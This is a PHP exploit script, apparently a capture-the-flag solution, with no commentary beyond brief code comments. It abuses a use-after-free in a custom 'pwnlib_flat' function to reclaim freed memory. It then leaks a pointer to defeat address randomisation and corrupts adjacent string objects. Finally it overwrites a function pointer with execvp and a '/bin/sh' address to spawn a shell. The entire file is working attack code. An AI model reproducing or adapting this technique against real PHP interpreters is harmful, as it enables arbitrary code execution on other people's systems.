<?php
	function create_awesome_objects() {
		$uaf = range(0, 10);
		pwnlib_flat($uaf);
		$reclaim1 = str_repeat("A", 24);
		// drop uaf once more, which results in dropping $reclaim
		$uaf = null;
		$reclaim2 = range(0,10);
		if (strlen($reclaim1) < 10000000) {
			die("[-] Failed to create magic string");
		}
		return array($reclaim1, $reclaim2);
	}

	[$write_object1, $victim_object1] = create_awesome_objects();

	// leak a pointer
	$zval_ptr_dtor = pwnlib_u64(substr($write_object1, 0x18, 0x8));
	$PIE = $zval_ptr_dtor - 0x2b3100;
	print("PIE: ".dechex($PIE)."\n");

	[$write_object2, $victim_object2] = create_awesome_objects();
	
	// either 1 or 2 must be in front of the other
	$marker1 = str_repeat(pwnlib_p32(0xcccccccc), 4);
	$marker2 = str_repeat(pwnlib_p32(0xdddddddd), 4);

	for ($i = 0; $i < 0x10; $i++) {
		$write_object1[$i] = $marker1[0];
		$write_object2[$i] = $marker2[0];
	}

	for ($i = 0; $i < 0x100000; $i++) {
		$slice1 = pwnlib_u64(substr($write_object1, $i*8, 0x8));
		$slice2 = pwnlib_u64(substr($write_object2, $i*8, 0x8));
		if ($slice1 == strlen($write_object2)) {
			if (substr($write_object1, $i*8+8, 0x10) == $marker2) {
				$offset = $i*8;
				print("[+] Found offset\n");
				break;
			}
		}
		if ($slice2 == strlen($write_object1)) {
			die("[!] I didn't assume this would happen");
		}
	}

	// set rdi to binsh
	$binsh_addr = $PIE + 0x448696;
	$packed_length = pwnlib_p64($binsh_addr);
	for ($i = 0; $i < 0x8; $i++) {
		$write_object1[$offset+$i] = $packed_length[$i];
	}

	if (strlen($write_object2) != $binsh_addr) {
		die("[-] Exploit failed");
	}

	// set rsi to 0
	$zero = pwnlib_p64(0);
	for ($i = 0x4; $i < 0x8; $i++) {
        	$write_object2[$i] = $zero[0];
	}
	
	// set function pointer
	$execvp = $PIE + 0xC3E80;
    	$packed_function = pwnlib_p64($execvp);
    	for ($i = 0; $i < 8; $i++) {
        	$write_object2[0x18+$i] = $packed_function[$i];
	}
	
	print("[+] Now triggering shell\n");
	$victim_object2 = null;

?>
